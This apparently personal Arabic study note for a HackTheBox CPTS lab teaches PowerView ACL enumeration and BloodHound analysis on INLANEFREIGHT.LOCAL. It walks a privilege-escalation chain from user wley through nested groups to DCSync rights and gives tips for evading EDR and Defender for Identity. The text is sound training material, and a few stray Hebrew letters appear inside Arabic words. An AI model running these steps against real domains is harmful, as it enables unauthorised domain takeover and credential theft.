---
title: "SEC 01: ACL Enumeration in Active Directory"
module: "Active Directory Enumeration & Attacks"
section_num: 1
target: "INLANEFREIGHT.LOCAL"
tags:
  - CPTS
  - Active-Directory
  - ACL-Enumeration
difficulty: "Medium"
vectors: "LDAP"
tools: "PowerView · BloodHound · Impacket"
status: "🟢 Complete"
date: "2026-08-01"
---

⚙️ T4E CYBERPUNK NOTES ✦ CPTS CERTIFICATION PATHWAY
📍 TARGET NODE: INLANEFREIGHT.LOCAL
🔐 ACCESS LEVEL: htb-student
📡 ATTACK VECTOR: LDAP
📋 SECTION ID: SEC-01
⚡ DIFFICULTY: 🟢 Medium
🏁 STATUS: 🟢 ONLINE — COMPLETE
🛠️ KEY TOOLS: PowerView · BloodHound
🎯 CORE OBJECTIVE: Enumerate ACLs to Domain Admin
📅 DATE: 2026-08-01

```text
╔══════════════════════════════════════════════════════════════════════╗
║                                                                      ║
║                      ████████╗██╗  ██╗███████╗                       ║
║                      ╚══██╔══╝██║  ██║██╔════╝                       ║
║                         ██║   ███████║█████╗                         ║
║                         ██║   ╚════██║██╔══╝                         ║
║                         ██║        ██║███████╗                       ║
║                         ╚═╝        ╚═╝╚══════╝                       ║
║                                                                      ║
║                       [ TECH FOR EVERYONE ]                          ║
║                                                                      ║
╠══════════════════════════════════════════════════════════════════════╣
║  [SYS]      :: NODE INITIALIZED — T4E NOTES v2.0                     ║
║  [SECTION]  :: SEC-01 // ACL Enumeration in Active Directory         ║
║  [DOMAIN]   :: INLANEFREIGHT.LOCAL                                   ║
║  [OPERATOR] :: Hexsein · Al-Nahrain University · CPTS Candidate      ║
║  [CLEARANCE]:: Level-3 // Penetration Testing Pathway                ║
╚══════════════════════════════════════════════════════════════════════╝
```




## ⚡ PHASE_I — النواة النظرية :: المفاهيم والبنية التحتية

> [!success] 📡 PHASE I INITIALIZED · THEORETICAL CORE UPLOAD
> **Language:** Arabic — **Size:** ~2,000 Words
> **Content:** Deep conceptual framework · Infrastructure theory · Hacker mindset · Big picture.

[تمام! استلمت نص السكشن. خلني أشرحلك إياه من الألف للياء:

🟢 Big Picture → 🔵 خريطة المفاهيم → 🟡 هيكل السكشن → 🟠 الشرح العميق → 🔴 ما لا يقوله السكشن → 💎 فلاشكاردز → 📄 ورقة غش السكشن

يله نبدأ...

━━━━━

🟢 المرحلة 0: Big Picture — ليش هذا الموضوع موجود؟

⚠️ تخيل وياي هذي القصة:

تخيل إنك دخلت بناية حكومية ضخمة بيها 10,000 غُرفة (هذي هي شبكة الـ Active Directory). إنت لقيت "باج" (ID Card) واقع على الكاع لموظف بسيط اسمه "أحمد" (المستخدم المخترق `wley`).

هسه إنت عندك خيارين:

الخيار الأول: تلزم الباج وتفتر على الـ 10,000 باب، تجرب تفتح باب باب حتى تشوف يا باب يفتح عندك. (هذا يعادل إنك تسحب كل الـ ACLs بالشبكة وتقراها سطر سطر — عملية تاخذ أشهر وتفضحك فوراً).

الخيار الثاني: تروح لغرفة السجلات المركزية، وتبحث بذكاء عن اسم "أحمد" وتشوف بالدفتر: أحمد مسموحله يفتح يا أبواب؟ راح تكتشف إن أحمد يقدر يفتح غرفة "تبديل الملابس"، وبداخل هاي الغرفة اكو باج ثاني يعود لمدير الصيانة، وهذا الباج يفتحلك غرفة السيرفرات!

ليش هذا الموضوع موجود؟

الـ Active Directory بيئة عملاقة ومعقدة بشكل مرعب. أدوات مثل PowerView تقدر تسحبلك "كل" الصلاحيات الموجودة بالدومين. بس المشكلة مو بـ "نقص" المعلومات، المشكلة بـ "غزارة" المعلومات (Information Overload). إذا استخدمت أوامر عامة، راح تغرق بملايين الأسطر من الـ Logs والصلاحيات اللي ما إلها أي قيمة (Noise).

لذلك، جاء هذا السكشن حتى  يعلمك مهارة الـ Targeted Enumeration (التعداد المُوجّه). يعلمك شلون تبدأ من نقطة صغيرة (اليوزر اللي إنت مخترقه حالياً) وتتتبع الخيط مثل المحقق الجنائي خطوة بخطوة لحد ما توصل لـ Domain Admin، بدون ما تغرقبالبيانات.

وين يظهر بالواقع؟

بالـ Pentest الحقيقي (Red Teaming)، الوقت هو عدوك، والـ Blue Team (المدافعين) يراقبون حركاتك. إذا سويت Scan لكل الشبكة راح ينصاد الـ Traffic مالتك. بينما إذا استخدمت أوامر PowerShell مخفية بذكاء (Built-in cmdlets) أو حللت البيانات ببرنامج BloodHound، راح تقدر ترسم خريطة الاختراق مال الشركة بثواني وتضرب ضربتك بدون ما حد يحس بيك.

وين يقع هذا السكشن بخريطة CPTS؟

هذا السكشن هو الـ "جسر" بين مرحلة (فهم الصلاحيات) اللي أخذناها بالسكشن السابق، وبين مرحلة (الاستغلال الحقيقي). هنا إنت دتخطط للهجوم وتجمع المعلومات الدقيقة حتى تنفذ.

شنو راح تكون قادر تسوي بعد ما تفهم هالسكشن؟

١. راح تبحث بالـ PowerView بذكاء باستخدام الـ SID بدل البحث العشوائي.

٢. راح تقدر تترجم الأكواد الغريبة (GUIDs) إلى كلمات مفهومة حتى تعرف شنو الصلاحية اللي لزمتها.

٣. راح تقدر تستخدم أوامر الويندوز الأصلية (Native) في حال كانت أدوات الاختراق محظورة.

٤. راح تفهم العقلية وراء أداة BloodHound وكيف ترسم مسارات الاختراق المعقدة (Attack Paths).

━━━━━

🔵 المرحلة 1: خريطة المفاهيم

السكشن مليان مصطلحات تقنية ورموز، خلينا نفلشها ونفهمها بالعراقي البسيط حتى من نقراها بالكود نعرف شنو معناها:

Targeted Enumeration (التعداد الموجه)

- شنو يعني بالعراقي؟ بدل ما تسأل النظام: "انطيني كل الصلاحيات اللي بالشركة"، تسأله: "انطيني بس الصلاحيات الخاصة بهذا اليوزر اللي أنا مخترقه". هذا يقلل الدوخة ويركز جهودك.
    

SID (Security Identifier - المُعرّف الأمني)

- شنو يعني بالعراقي؟ رقم الهوية الموحد بالويندوز. الويندوز غبي من ناحية الأسماء، ما يعرف يوزر اسمه `wley`، يعرفه كرقم طويل يبدأ بـ `S-1-5-21...`. كل أوامر البحث الدقيقة لازم نترجم بيها الاسم إلى SID حتى الويندوز يفهمنا.
    

GUID (Globally Unique Identifier - المُعرّف الفريد العالمي)

- شنو يعني بالعراقي؟ بالويندوز، كل "صلاحية" (مثل تغيير الباسورد، أو قراءة البيانات) إلها كود تسلسلي خاص بيها مو اسم. يعني بدل ما يكتب بالنظام "حق تغيير الباسورد"، يكتب كود مثل `00299570-...`. إذا شفت هذا الكود راح تدوخ لأنك ما تدري هذا الكود يمثل شنو.
    
- وين يظهر؟ يظهر كقيمة بـ `ObjectAceType` من تسحب الـ ACLs.
    

ResolveGUIDs (ترجمة المعرفات)

- شنو يعني بالعراقي؟ هو Flag (مفتاح سحري) نحطه بأداة PowerView. وظيفته ياخذ الأرقام المزعجة (GUIDs) ويترجمها للعربي (أو للإنجليزي المفهوم). يقلب الـ `00299570` إلى `User-Force-Change-Password` حتى إنت تفهم.
    

Nested Groups (المجموعات المتداخلة)

- شنو يعني بالعراقي؟ مثل فكرة الماتريوشكا (اللعابة الروسية). مجموعة ببطن مجموعة. إذا إنت انضفيت لجروب "الدعم الفني"، وجروب "الدعم الفني" أصلاً عضو بجروب "الآي تي"... هذا يعني إنت تلقائياً ورثت كل صلاحيات جروب الآي تي العالية!
    

Transitive Object Control (السيطرة المتعدية)

- شنو يعني بالعراقي؟ تأثير الدومينو. أنا أسيطر على أحمد، وأحمد يسيطر على علي، وعلي يسيطر على السيرفر... إذن أنا أسيطر على السيرفر! BloodHound يحسب هذي السلسلة المتعدية بضغطة زر.
    

DCSync (هجوم مزامنة متحكم المجال)

- شنو يعني بالعراقي؟ أخطر وأقوى هجوم بالـ AD. إذا يوزر عنده صلاحيات معينة (Replication)، يقدر يوهم السيرفر المركزي (DC) ويقوله: "أنا سيرفر ثاني جديد، انطيني نسخة من كل باسووردات الشركة حتى أسويلها مزامنة". السيرفر راح ينطيك الباسووردات كلها بدون أي اختراق!
    

━━━━━

🟡 المرحلة 2: هيكل السكشن — شنو يعلّمك وكيف؟

📖 ترجمة عنوان السكشن وموضوعه:

السكشن اسمه "ACL Enumeration" يعني "تعداد قوائم التحكم بالوصول". يقع هذا السكشن ضمن موديول هجمات الأكتيف دايركتوري في مسار CPTS.

🎯 ماذا يريد هذا السكشن أن تتعلم؟

١. استخدام أدوات سطر الأوامر (PowerView) للبحث الدقيق عن الصلاحيات لحساب تملكه.

٢. بناء سكربتات بسيطة بالـ PowerShell للبحث إذا كانت الأدوات الهجومية محظورة.

٣. تتبع مسار هجوم معقد (Attack Path) يتكون من عدة قفزات (User -> Group -> Group -> User -> Domain).

٤. ترجمة هذا التتبع اليدوي المتعب إلى رؤية بصرية سهلة باستخدام أداة BloodHound.

📐 هيكل المحتوى (Section Blueprint):

السكشن مقسم لجزأين رئيسيين، وكل جزء يبني على الثاني:

الجزء الأول: [PowerView & Manual PowerShell] — يشرح المشكلة (كثرة البيانات) والحل (البحث عن SID محدد). ثم يعلمك كيف تترجم الـ GUID، وينطيك بديل "Native" (كود PowerShell خام) للمحترفين.

الجزء الثاني: [تتبع مسار الهجوم] — هنا التطبيق العملي. ياخذك برحلة اختراق واقعية من يوزر `wley` إلى أن توصل للسيطرة على الدومين عبر 4 قفزات متتالية.

الجزء الثالث: [الرؤية البصرية بـ BloodHound] — يراويك نفس الرحلة اللي تعبت بيها فوق، بس كيف تطلعلك مرسومة وجاهزة ببرنامج BloodHound لتسهيل حياة الـ Pentester.

تدفق التعلم:

```
[الفشل في البحث العشوائي]
       │
       ▼
[البحث الذكي (Targeted) باستخدام SID]
       │
       ▼
[تخطي عقبة الـ GUIDs الغامضة]
       │
       ▼
[قفزات الاختراق: وراثة الجروبات (Nested Groups)]
       │
       ▼
[BloodHound: الخريطة السحرية اللي تختصر كل ما سبق]
```

🔗 المتطلبات السابقة:

لازم تكون فاهم شنو يعني ACEs و ACLs (السكشن اللي قبله مباشرة)، وتعرف شنو يعني `GenericWrite` و `ForceChangePassword`. ولازم تعرف أساسيات PowerShell (شنو يعني Pipe `|` وشنو يعني متغيّر `$`).

⚠️ ما يذكره السكشن ضمنياً بدون توضيح:

- يفترض إنك منزل أداة PowerView بحاسبتك أو حاسبة الضحية وجاهز تسويلها Import.
    
- يفترض إنك مسوي Run لبرنامج `SharpHound` بالخلفية وساحب الداتا ومستوردها لـ BloodHound (لهذا جاب سيرة صور BloodHound مباشرة بدون ما يعلمك شلون تسحب الداتا، لأن افترض إنك تعرفها من موديولات سابقة).
    

━━━━━

🟠 المرحلة 3: الشرح العميق

هسه راح ندخل بالعمق، سطر سطر وكود كود، ونفصّل هذي الرحلة الممتعة.

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

🔷 المفهوم/التقنية [١]: مشكلة الضوضاء والبحث الذكي (Targeted Enumeration)

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

💡 بالعراقي البسيط:

أداة PowerView بيها أمر جاهز يجيبلك الأشياء المهمة، اسمه `Find-InterestingDomainAcl`. السكشن يكولك: لا تستخدمه ببيئة كبيرة! لأن راح يطبعلك آلاف الأسطر بالشاشة وراح تضيع (مثل ما واضح بالـ Output الطويل بالنص). الحل هو إنك تلزم اليوزر اللي إنت اخترقته (مثلاً `wley`)، تحول اسمه إلى رقم SID، وتدور بالشبكة بس على الأماكن اللي هذا الرقم إله صلاحية بيها.

🎭 التشبيه:

مثل شخص مضيع محفظته بمول كبير. الأمر الأول (البحث العشوائي) يخليك تدور بكل محلات المول. الأمر الثاني (Targeted) يخليك تروح لكاميرات المراقبة وتتبع خط سيرك إنت فقط، وين مشيت وين رحت، وتدور بس بهذي الأماكن.

🔬 ليش يعمل هيج؟ (المبدأ الجوهري):

الـ Active Directory يخزن الصلاحيات (ACLs) بناءً على الـ Security Identifiers (SID). حتى نسوي فلترة (Filtering) قوية بالـ PowerShell، لازم نسحب الـ SID مال اليوزر اللي نريده، ونطلب من الويندوز يقارنه وي كل الـ ACEs بالدومين.

🔧 الأمر (تحويل الاسم إلى SID ثم البحث):

PowerShell

```
# Step 1: Convert the compromised username to a SID
$sid = Convert-NameToSid wley

# Step 2: Search for any object where our SID is listed in the ACL
Get-DomainObjectACL -Identity * | ? {$_.SecurityIdentifier -eq $sid}
```

💬 شرح الـ flags والأوامر:

- `$sid = Convert-NameToSid`: هذا أمر بـ PowerView ياخذ اسم اليوزر `wley` ويحوله لرقم مثل `S-1-5-21...` ويخزنه بمتغير اسمه `$sid`.
    
- `Get-DomainObjectACL -Identity *`: هذا الأمر يسحب **كل** الصلاحيات مال **كل** شيء بالشبكة (الـ `*` تعني الكل). راح ياخذ وقت طويل.
    
- `|`: هذا الـ Pipe ياخذ جبل البيانات اللي طلعه الأمر الأول، ويدخله بفلتر.
    
- `?`: اختصار لكلمة `Where-Object` بالباورشيل (أداة تصفية).
    
- `{$_.SecurityIdentifier -eq $sid}`: الـ `$_` تعني (العنصر الحالي اللي ديمر بالفلتر). نقول للباورشيل: إذا جان حقل الـ `SecurityIdentifier` مال هذا العنصر يساوي (`-eq`) الـ `$sid` مالتنا اللي خزنناه، اطبعلي إياه، وإذا لا.. ارميه!
    

Plaintext

```
ASCII Diagram - The PowerView Filter Flow:

[All 50,000 AD ACLs]
       │
       ▼
   [ Pipe | ]
       │
       ▼
[Filter: Is SecurityIdentifier == wley's SID?]
       ├── NO  ─► (Discarded)
       ├── NO  ─► (Discarded)
       └── YES ─► [Output to Attacker Screen]
```

⏸️ نقطة توقف — ماذا فهمنا لحد هسة؟:

فهمنا إن البحث العشوائي مضيعة للوقت، وإنه الفلترة بالباورشيل باستخدام الـ SID هي الطريقة الاحترافية للبحث عن "ماذا أستطيع أن أفعل باليوزر الذي أملكه الآن".

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

🔷 المفهوم/التقنية [٢]: فك شفرة الـ GUIDs (استخدام -ResolveGUIDs)

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

💡 بالعراقي البسيط:

لما تنفذ أمر البحث اللي فوق، راح يطلعلك إن يوزر `wley` عنده صلاحية على يوزر اسمه `damundsen`. بس من تقرا نوع الصلاحية (بحقل اسمه `ObjectAceType`) راح تلقاها كود أرقام غريب جداً `00299570-246d-11d0-a768-00aa006e0529`. إنت كمخترق ما راح تعرف هذي شنو: هل هي حق قراءة؟ حق كتابة؟ تغيير باسورد؟ الحل إما تبحث عنها بجوجل، أو تخلي الأداة تترجمها إلك برمجياً.

🎭 التشبيه:

تخيل الدكتور كتبلك وصفة دوه بشفرة طبية، تروح للصيدلاني تقوله "انطيني دوه رقم 458"، الصيدلاني يباوع بالسيستم يترجم الرقم ويكولك: "آه، هذا براسيتامول". الـ ResolveGUIDs هو الصيدلاني مالتك.

🔬 ليش يعمل هيج؟ (المبدأ الجوهري):

مايكروسوفت تستخدم الـ GUIDs (أرقام فريدة عالمية بحجم 128-bit) لتعريف الخصائص بالـ Schema مال الأكتيف دايركتوري حتى تتجنب تكرار الأسماء (Name Collision) بين البرامج المختلفة. هذا مفيد للنظام، بس سيء جداً للقراءة البشرية.

🔧 الأمر (تفعيل الترجمة التلقائية):

PowerShell

```
Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid}
```

💬 شرح الـ flags:

- `-ResolveGUIDs`: هذا المفتاح السحري يطلب من أداة PowerView إنها تتصل بقاعدة بيانات الأكتيف دايركتوري بالخلفية، وتسأل عن كل GUID وتستبدله بالاسم البشري المفهوم (DisplayName) قبل ما تطبعه على الشاشة.
    

📤 الـ Output المتوقع (بعد الترجمة):

Plaintext

```
AceQualifier           : AccessAllowed
ObjectDN               : CN=Dana Amundsen...
ActiveDirectoryRights  : ExtendedRight
ObjectAceType          : User-Force-Change-Password   <-- (Bingo! الترجمة نجحت)
...
```

🔍 كيف تقرأ الـ Output؟:

هسه صارت واضحة! الـ `ObjectDN` هو الضحية (Dana Amundsen). والـ `ObjectAceType` هو الثغرة اللي لزمناها (نقدر نغير باسووردها بدون ما نعرف الباسوورد القديم!).

❓ الـ "بس ليش؟":

"ليش السكشن انطاني كود طويل يسوي Reverse Search بالباورشيل إذا الـ ResolveGUIDs يحل المشكلة بكلمة وحدة؟"

لأن أدوات مثل PowerView ممكن تكون مكشوفة وممحذوفة من قبل الـ Antivirus. كـ Hacker محترف، لازم تعرف "شلون" الأداة تشتغل تحت الغطاء باستخدام أوامر باورشيل عادية مثل `Get-ADObject` حتى إذا الأداة انحظرت، إنت تكتب الكود بيدك.

⏸️ نقطة توقف — ماذا فهمنا لحد هسة؟:

عرفنا شلون نبحث، والأهم عرفنا شلون نخلي نواتج البحث مفهومة ومقروءة لنا كبشر باستخدام ترجمة الـ GUIDs. هسه مسكنا أول خيط للاختراق (`wley` يقدر يضرب `damundsen`).

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

🔷 المفهوم/التقنية [٣]: بناء مسار الهجوم المتسلسل (Attack Path Chaining)

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

💡 بالعراقي البسيط:

هنا المتعة الحقيقية للسكشن! السكشن راح ياخذنا برحلة "قفزات" متتالية. كل ما نسيطر على يوزر، نستخدمه حتى نكتشف شنو يقدر يسوي، ونسيطر على اللي بعده، لحد ما نوصل لقلب الشركة. السكشن يراويك هذا المسار برمجياً خطوة بخطوة.

🎭 التشبيه:

مثل لعبة السلالم والثعابين (أو الماريو). إنت هسه بشخصية `wley`، لزمت نجمة خلتك تاكل شخصية `damundsen`. هسه إنت صرت `damundsen`، دورت بجيوبك لقيت مفتاح يفتحلك باب جروب "مستوى الدعم الفني 1". دخلت للجروب، لقيت هذا الجروب أصلاً معزوم بحفلة كبار الشخصيات بجروب "تكنولوجيا المعلومات". دخلت للحفلة ولقيت مدير اسمه `adunn` وقدرت تسيطر عليه. هذا المدير عنده مفاتيح الخزنة الرئيسية مال البنك (DCSync).

🔬 ليش يعمل هيج؟ (المبدأ الجوهري):

هذا هو تجسيد لثغرات (Misconfigurations) الإدارة بالشركات. الأدمنية ينطون صلاحيات بشكل فوضوي ومرور السنين تتراكم، ويصير تداخل (Nesting) بالجروبات. המهاجم يجمع هذي الفوضى البسيطة ويحولها لسلسلة قاتلة.

🔧 القفزة الأولى: من damundsen إلى الجروب:

بعد ما سحبنا باسورد damundsen وغيرناه، خلينا نشوف هو شنو يملك:

PowerShell

```
$sid2 = Convert-NameToSid damundsen
Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid2} -Verbose
```

📤 النتيجة المختصرة: يوزر `damundsen` يملك `GenericWrite` على جروب اسمه `Help Desk Level 1`. (يعني يقدر يضيف أي شخص لهذا الجروب).

🔧 القفزة الثانية: اكتشاف الجروبات المتداخلة (Nested Groups):

نجي نفحص هذا الجروب، هل هو مهم؟

PowerShell

```
Get-DomainGroup -Identity "Help Desk Level 1" | select memberof
```

📤 النتيجة: `CN=Information Technology...`

معناها جروب "الهيلب ديسك" هو عضو بجروب أكبر وأخطر اسمه "الآي تي". إذا ضفنا نفسنا بالهيلب ديسك، راح نورث كل أسلحة جروب الآي تي.

🔧 القفزة الثالثة: من جروب الآي تي إلى الهدف السمين:

شنو يملك جروب الآي تي؟

PowerShell

```
$itgroupsid = Convert-NameToSid "Information Technology"
Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $itgroupsid}
```

📤 النتيجة: يملكون `GenericAll` (سيطرة تامة) على يوزر اسمه `adunn` (أنجيلا).

🔧 القفزة الرابعة: أنجيلا تملك الدومين!

نفحص أنجيلا:

PowerShell

```
$adunnsid = Convert-NameToSid adunn 
Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $adunnsid}
```

📤 النتيجة: أنجيلا تملك `DS-Replication-Get-Changes`. هذي مو صلاحية عادية، هذا المفتاح النووي! هذي الصلاحية تسمحلك تنفذ هجوم DCSync وتسحب باسوورد الـ Administrator الكبير.

Plaintext

```
ASCII Diagram - The Complete Attack Path:

[wley] ──(ForceChangePassword)──► [damundsen] 
                                      │
                             (GenericWrite - AddMember)
                                      ▼
                           [Help Desk Level 1 Group]
                                      │
                                 (Member Of)
                                      ▼
                        [Information Technology Group]
                                      │
                                (GenericAll)
                                      ▼
                                   [adunn]
                                      │
                              (DS-Replication)
                                      ▼
                            [DOMAIN COMPROMISE (DCSync)]
```

⏸️ نقطة توقف — ماذا فهمنا لحد هسة؟:

فهمنا إن الاختراق مو ثغرة وحدة تنضرب، بل هو تجميع לـ "بازل" (Puzzle) من الصلاحيات الشرعية الخاطئة، وحدة توصل للثانية.

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

🔷 المفهوم/التقنية [٤]: الرؤية البصرية بـ BloodHound

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

💡 بالعراقي البسيط:

كل هالكود والتعب والبحث بالـ PowerView، يكلف وقت وجهد ودوخة بالعيون. أداة BloodHound إجت حتى تسوي كل هذا بالنيابة عنك وتطلعلك إياه كـ "رسمة" (Graph). ترفع بيها البيانات، وتختار يوزرك، وهي تطلعلك الأسهم والألوان وتقولك: اضغط هنا حتى تخترق هذا!

🎭 التشبيه:

الـ PowerView هو كأنك تمشي بالمدينة وتفتح خريطة ورقية تسأل الناس عن الطريق شارع شارع. الـ BloodHound هو الـ Google Maps (GPS). يقولك: امشِ من هنا، واخذ يمين، راح توصل للهدف بأقصر طريق، ويراويك إياها ملونة.

🔬 ليش يعمل هيج؟ (المبدأ الجوهري):

BloodHound مبني على تقنية اسمها "Graph Theory" (نظرية المخططات). هو يشوف الأكتيف دايركتوري كـ "Nodes" (عقد = يوزرات أو جروبات) و "Edges" (حواف = نوع الصلاحية اللي تربطهم). هذا يخليه يقدر يحسب "أقصر مسار للاختراق" (Shortest Path) بثواني رياضياً.

🔍 كيف تقرأ الـ BloodHound (من الصور المرفقة بالسكشن):

- التبويب `Node Info`: من تضغط على يوزر مثل `wley`، راح يطلعلك مربع عاليسار.
    
- `Outbound Control Rights`: هذي هي الأسلحة اللي تملكها. الصلاحيات اللي تطلع "منك" للآخرين.
    
- `First Degree Object Control`: الأهداف اللي تقدر تضربها بشكل مباشر (قفزة وحدة). مثل `damundsen`.
    
- `Transitive Object Control`: الأهداف اللي تقدر تضربها بشكل "غير مباشر" (عبر عدة قفزات). بالصورة مكتوب رقم 16! يعني إنت بطريقة غير مباشرة تقدر تسيطر على 16 كائن بالشبكة بسلسلة اختراقات!
    
- `Help Edge`: إذا دست كلك أيمن على السهم بين `wley` و `damundsen`، الأداة راح تعطيك الشرح، والكود الجاهز للاستغلال، وحتى نصائح الـ OPSEC حتى ما تنكشف.
    

⏸️ نقطة توقف — ماذا فهمنا لحد هسة؟:

فهمنا إن BloodHound هي الأداة السحرية اللي تحلل كل فوضى الـ ACLs وتترجمها لخريطة هجوم جاهزة للتنفيذ، وتستبدل ساعات من شغل הـ PowerView اليدوي.

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

📊 ملخص ما تعلمنا:

|**المفهوم / الأداة**|**ما تعني / وظيفتها**|**متى تستخدمها**|
|---|---|---|
|`Convert-NameToSid`|تحويل الاسم لرقم هوية الويندوز|في بداية أي بحث دقيق بالـ PowerView|
|`-ResolveGUIDs`|ترجمة الأكواد المعقدة لأسماء مفهومة|دائماً مع `Get-DomainObjectACL` لفهم النتائج|
|Targeted Enumeration|البحث الموجه المنطلق من حساب مخترق|لتقليل الضوضاء وتجنب إنذار فرق الحماية|
|Nested Groups|الجروبات المتداخلة التي تورث الصلاحيات|للبحث عن طرق لرفع الصلاحيات بشكل متعدٍ (Transitive)|
|BloodHound|أداة التحليل البصري ورسم مسارات الاختراق|كبديل سريع وآلي لكل خطوات التعداد اليدوية|

━━━━━

🔴 المرحلة 4: ما لا يقوله السكشن

هنا راح أنطيك الـ "أسرار" اللي المحترفين يعرفوها والسكشن ما ركز عليها بشكل كافي:

🕳️ الثغرات في شرح السكشن:

١. بطء الـ PowerView في البيئات الضخمة:

السكشن ذكر إن الأمر `Get-DomainObjectACL -Identity *` "ياخذ 1-2 دقيقة باللاب". بالواقع (الشركات اللي بيها 50,000 يوزر)، هذا الأمر راح يخلي الحاسبة تعلق وممكن يطول "ساعات" ويسحب جيجابايتات من الرام، وممكن نظام الـ EDR يسوي Kill للبروسيس مالتك! لذلك بالواقع إحنا نعتمد 99% على SharpHound (الخاص ببلودهوند) لأنه مصمم ومبرمج بـ C# حتى يسحب الداتا بسرعة خيالية وبأقل ضغط على الشبكة.

٢. السكشن ما شرح أداة SharpHound:

فجأة السكشن كلك "خلي نرفع الداتا للـ BloodHound". منين إجت الداتا؟ إجت من سكربت اسمه SharpHound لازم تشغله أول شي بالحاسبة المخترقة حتى يسحب כל הـ ACLs ويضغطها بملف zip، وبعدين تنقل هذا الملف لحاسبة الكالي مالتك وترفعه للبلودهوند.

⚠️ الـ Gotchas عند تطبيق هذا بالـ Lab أو الواقع:

١. فخ تفعيل الصلاحية (Token Refresh):

بالـ Attack Path، السكشن كلك: "إنت عندك GenericWrite، ضيف نفسك لجروب Help Desk واستمتع بالصلاحيات".

الـ Gotcha: إذا ضفت نفسك بالجروب عبر سطر الأوامر، الصلاحيات **ما راح تتفعل فوراً**! الويندوز يحسب صلاحيات الجروبات بس لحظة تسجيل الدخول (Logon). حتى تتفعل صلاحياتك، لازم تسوي Log off وترجع تسوي Log on، أو تستخدم تقنيات متقدمة مثل `klist purge` وطلب تذكرة Kerberos جديدة. مبتدئين الـ HTB يظلون ساعات يكتبون أوامر وتطلعهم Access Denied لأنهم ناسين يحدثون الـ Session.

٢. الثقة العمياء بـ BloodHound:

أداة BloodHound ترسم مسارات الهجوم بناءً على "وقت سحب البيانات". إذا إنت سحبت الداتا يوم الأحد، وبدأت الهجوم يوم الثلاثاء، ممكن يكون الأدمن مسح صلاحية `GenericAll`! إذا جربت تهاجم وفشلت، ارجع لـ PowerView وتأكد من الصلاحية بـ (Real-time).

🔗 ربط بسكاشن/موديولات أخرى:

- الموديول ذكر `DS-Replication-Get-Changes`. هذا المفهوم راح تدرسه بالتفصيل الممل بموديول `Attacking Domain Services` وتحديداً בסקשן الـ `DCSync`.
    
- هجوم الكيربيروستينج (Kerberoasting) اللي ذكره כـ خيار للاستغلال عبر `GenericAll` موجود بالتفصيل بموديول `Kerberos Attacks`.
    

🌍 السياق الحقيقي (Real Pentest Context):

بالـ Red Teaming الحقيقي، الـ BloodHound هو سيف ذو حدين. تشغيل SharpHound لسحب הדاتا يسوي "عاصفة" من الاستعلامات (LDAP Queries). أنظمة الحماية الحديثة مثل Microsoft Defender for Identity (MDI) تصيد הـ SharpHound فوراً! بهيج حالة، الهاكر المحترف يتخلى عن سهولة BloodHound، ويرجع يستخدم "كود הـ foreach loop" اللي شفناه بالسكشن، لأنه كود Native (أصلي بالويندوز) بطيء جداً وهادئ، وما ينطي إنذارات للـ Blue Team (هذا نسميه Living off the Land).

🏆 النصيحة الذهبية للـ CPTS Exam:

بامتحان الـ CPTS، لا تتعب نفسك بالتتبع اليدوي العميق بالـ PowerView إذا ما كنت مضطر. مجرد ما تثبت قدمك بأول يوزر، اسحب الداتا بـ SharpHound، ارفعها لـ BloodHound، واستخدم تبويب `Shortest Paths` -> `Find Shortest Paths to Domain Admins`. راح يوفر عليك ساعات من التوهان ويحطك على بداية الخيط فوراً. استخدم PowerView فقط كـ "أداة تأكيد" (Verification) للخطوة اللي تريد تنفذها هسه.

━━━━━

💎 الفلاشكاردز — ملخص السكشن للحفظ

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

🔹 Card #1

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

❓ Front: لماذا لا ينصح باستخدام `Find-InterestingDomainAcl` في بيئات AD ضخمة؟

✅ Back: لأنه يقوم ببحث شامل يعيد كمية هائلة من البيانات (Noise) يصعب تحليلها، ويستغرق وقتاً طويلاً وقد يثير إنذارات الحماية.

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

🔹 Card #2

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

❓ Front: ما هو الغرض من الأمر `Convert-NameToSid` قبل بدء البحث بالـ PowerView؟

✅ Back: قوائم الـ ACL تستخدم أرقام הـ SID وليس الأسماء لتسجيل الصلاحيات، لذلك يجب تحويل اسم المستخدم المخترق لـ SID للبحث عن صلاحياته (Targeted Enumeration).

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

🔹 Card #3

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

❓ Front: ما وظيفة الـ flag `-ResolveGUIDs` في أوامر PowerView؟

✅ Back: يقوم بترجمة أكواد הـ GUIDs المعقدة (مثل أرقام `ObjectAceType`) إلى أسماء مقروءة للبشر تمثل الصلاحيات الفعلية (مثل User-Force-Change-Password).

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

🔹 Card #4

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

❓ Front: ما هو مفهوم الـ Nested Groups (المجموعات المتداخلة) وكيف يفيد المهاجم؟

✅ Back: هو وجود مجموعة داخل مجموعة أخرى. المهاجم يستفيد منه بـ "وراثة" صلاحيات المجموعة الأكبر بمجرد إضافته للمجموعة الأصغر (Transitive Object Control).

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

🔹 Card #5

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

❓ Front: متى نضطر لاستخدام أوامر PowerShell الأصلية (مثل Get-Acl) بدل PowerView؟

✅ Back: في البيئات المراقبة بشدة حيث تقوم أنظمة الـ EDR/AV بحظر أو اكتشاف أدوات الاختراق الخارجية مثل PowerView.

